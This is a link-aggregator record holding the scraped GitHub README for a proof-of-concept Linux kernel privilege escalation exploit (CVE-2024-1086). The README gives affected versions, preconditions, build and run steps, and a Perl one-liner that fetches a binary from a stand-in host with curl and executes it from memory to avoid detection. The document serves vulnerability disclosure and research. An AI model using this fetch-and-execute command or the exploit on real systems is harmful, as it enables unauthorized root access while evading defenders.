{"aid": "40000386", "title": "Universal local privilege escalation exploit for CVE-2024-1086", "url": "https://github.com/Notselwyn/CVE-2024-1086", "domain": "github.com/notselwyn", "votes": 2, "user": "jedisct1", "posted_at": "2024-04-11 09:57:05", "comments": 0, "source_title": "GitHub - Notselwyn/CVE-2024-1086: Universal local privilege escalation Proof-of-Concept exploit for CVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.", "source_text": "GitHub - Notselwyn/CVE-2024-1086: Universal local privilege escalation Proof-\nof-Concept exploit for CVE-2024-1086, working on most Linux kernels between\nv5.14 and v6.6, including Debian, Ubuntu, and KernelCTF. The success rate is\n99.4% in KernelCTF images.\n\nSkip to content\n\nSign in\n\n# Search code, repositories, users, issues, pull requests...\n\nSearch syntax tips\n\nSign in\n\nSign up\n\nYou signed in with another tab or window. Reload to refresh your session. You\nsigned out in another tab or window. Reload to refresh your session. You\nswitched accounts on another tab or window. Reload to refresh your session.\nDismiss alert\n\nNotselwyn / CVE-2024-1086 Public\n\n  * Notifications\n  * Fork 219\n  * Star 1.8k\n\nUniversal local privilege escalation Proof-of-Concept exploit for\nCVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including\nDebian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.\n\npwning.tech/nftables\n\n### License\n\nMIT license\n\n1.8k stars 219 forks Branches Tags Activity\n\nStar\n\nNotifications\n\n# Notselwyn/CVE-2024-1086\n\nThis commit does not belong to any branch on this repository, and may belong\nto a fork outside of the repository.\n\n1 Branch\n\n1 Tags\n\n## Folders and files\n\nName| Name| Last commit message| Last commit date  \n---|---|---|---  \n  \n## Latest commit\n\nNotselwynUpdate README.md90615e0 \u00b7\n\n## History\n\n54 Commits  \n  \n### include\n\n|\n\n### include\n\n| feat: added third party license notices for libnftnl and libmnl  \n  \n### lib\n\n|\n\n### lib\n\n| feat: added third party license notices for libnftnl and libmnl  \n  \n### src\n\n|\n\n### src\n\n| fix: increase PID_MAX from 65536 to 4194304  \n  \n### .gitignore\n\n|\n\n### .gitignore\n\n| feat: pasted the exploit (including disclaimer)  \n  \n### LICENSE\n\n|\n\n### LICENSE\n\n| Create LICENSE  \n  \n### Makefile\n\n|\n\n### Makefile\n\n| feat: pasted the exploit (including disclaimer)  \n  \n### README.md\n\n|\n\n### README.md\n\n| Update README.md  \n  \n## Repository files navigation\n\n# CVE-2024-1086\n\nUniversal local privilege escalation Proof-of-Concept exploit for\nCVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including\nDebian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.\n\n## Blogpost / Write-up\n\nA full write-up of the exploit - including background information and loads of\nuseful diagrams - can be found in the Flipping Pages blogpost.\n\n## Affected versions\n\nThe exploit affects versions from (including) v5.14 to (including) v6.6,\nexcluding patched branches v5.15.149>, v6.1.76>, v6.6.15>. The patch for these\nversions were released in feb 2024. The underlying vulnerability affects all\nversions (excluding patched stable branches) from v3.15 to v6.8-rc1.\n\nCaveats:\n\n  * The exploit does not work on v6.4> kernels with kconfig CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y (including Ubuntu v6.5)\n  * The exploits requires user namespaces (kconfig CONFIG_USER_NS=y), that those user namespaces are unprivileged (sh command sysctl kernel.unprivileged_userns_clone = 1), and that nf_tables is enabled (kconfig CONFIG_NF_TABLES=y). By default, these are all enabled on Debian, Ubuntu, and KernelCTF. Other distro's have not been tested, but may work as well. Additionally, the exploit has only been tested on x64/amd64.\n  * The exploit may be very unstable on systems with a lot of network activity\n\n    * Systems with WiFi adapter, when surrounded by high-usage WiFi networks, will be very unstable.\n    * On test devices, please turn off WiFi adapters through BIOS.\n  * The kernel panic (system crash) after running the exploit is a side-effect which deliberately hasn't been fixed to prevent malicious usage of the exploit (i.e. exploitation attempts should now be more noticable, and unpractical in real-world operations). Despite this, it still allows for a working proof-of-concept in lab environments, as the root shell is functional, and persistence through disk is possible.\n\n## Usage\n\n### Configuration\n\nThe default values should work out of the box on Debian, Ubuntu, and KernelCTF\nwith a local shell. On non-tested setups/distros, please make sure the kconfig\nvalues match with the target kernel. These can be specified in src/config.h.\nIf you are running the exploit on a machine with more than 32GiB physical\nmemory, make sure to increase CONFIG_PHYS_MEM. If you are running the exploit\nover SSH (into the test machine) or a reverse shell, you may want to toggle\nCONFIG_REDIRECT_LOG to 1 to avoid unnecessary network activity.\n\n### Building\n\nIf this is impractical for you, there is an compiled x64 binary with the\ndefault config.\n\n    \n    \n    git clone https://github.com/Notselwyn/CVE-2024-1086 cd CVE-2024-1086 make\n\nBinary: CVE-2024-1086/exploit\n\n### Running\n\nRunning the exploit is just as trivial:\n\n    \n    \n    ./exploit\n\nFileless execution is also supported, in case of pentest situations where\ndetections need to be avoided. However, Perl needs to be installed on the\ntarget:\n\n    \n    \n    perl -e ' require qw/syscall.ph/; my $fd = syscall(SYS_memfd_create(), $fn, 0); system \"curl https://example.com/exploit -s >&$fd\"; exec {\"/proc/$$/fd/$fd\"} \"memfd\"; '\n\n## Disclaimer\n\nThe programs and scripts (\"programs\") in this software\ndirectory/folder/repository (\"repository\") are published, developed and\ndistributed for educational/research purposes only. I (\"the creator\") do not\ncondone any malicious or illegal usage of the programs in this repository, as\nthe intend is sharing research and not doing illegal activities with it. I am\nnot legally responsible for anything you do with the programs in this\nrepository.\n\n## About\n\nUniversal local privilege escalation Proof-of-Concept exploit for\nCVE-2024-1086, working on most Linux kernels between v5.14 and v6.6, including\nDebian, Ubuntu, and KernelCTF. The success rate is 99.4% in KernelCTF images.\n\npwning.tech/nftables\n\n### Topics\n\nexploit poc cve lpe cve-2024-1086\n\n### Resources\n\nReadme\n\n### License\n\nMIT license\n\nActivity\n\n### Stars\n\n1.8k stars\n\n### Watchers\n\n18 watching\n\n### Forks\n\n219 forks\n\nReport repository\n\n## Releases 1\n\nx64 build (Debian/Ubuntu) Latest\n\nMar 23, 2024\n\n## Packages 0\n\nNo packages published\n\n## Contributors 2\n\n  * Notselwyn Lau\n  * mauke\n\n## Languages\n\n  * C 97.8%\n  * Batchfile 2.0%\n  * Other 0.2%\n\n## Footer\n\n\u00a9 2024 GitHub, Inc.\n\nYou can\u2019t perform that action at this time.\n\n", "frontpage": false}
